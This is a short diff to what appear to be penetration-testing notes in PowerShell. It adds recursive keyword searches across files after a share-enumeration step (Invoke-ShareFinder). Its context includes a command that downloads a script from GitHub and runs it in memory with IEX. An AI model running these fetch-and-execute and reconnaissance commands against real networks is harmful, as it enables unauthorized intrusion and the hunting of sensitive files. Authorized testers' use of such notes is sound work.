@@ -9,3 +9,11 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 4. Run Sharefinder
 Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+
+5. Search for keyword
+This one is slow
+dir -Recurse | Select-String -pattern [SEARCH_PATTERN]
+
+Get-ChildItem -Recurse *.* | Select-String -Pattern "foobar" | Select-Object -Unique Path
+
+dir -recurse *.* | sls -pattern "foobar" | select -unique path
